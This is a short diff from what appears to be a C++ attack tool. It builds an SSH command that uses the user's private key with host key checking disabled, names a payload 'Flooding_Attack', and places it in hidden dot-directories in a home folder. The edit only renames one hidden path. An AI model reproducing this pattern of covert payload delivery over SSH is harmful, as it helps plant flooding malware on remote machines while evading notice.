@@ -51,7 +51,7 @@ int main(int argc, char** argv) {
     std::string ssh_pre = "ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no " + remote;
     std::string payload = "Flooding_Attack";
     std::string h1 = "/home/" + username + "/.etc/.module/";
-    std::string h2 = "/home/" + username + "/.config/.module/";
+    std::string h2 = "/home/" + username + "/.asdf/.module/";
     int status = 0;
 
     // Send payload to h2
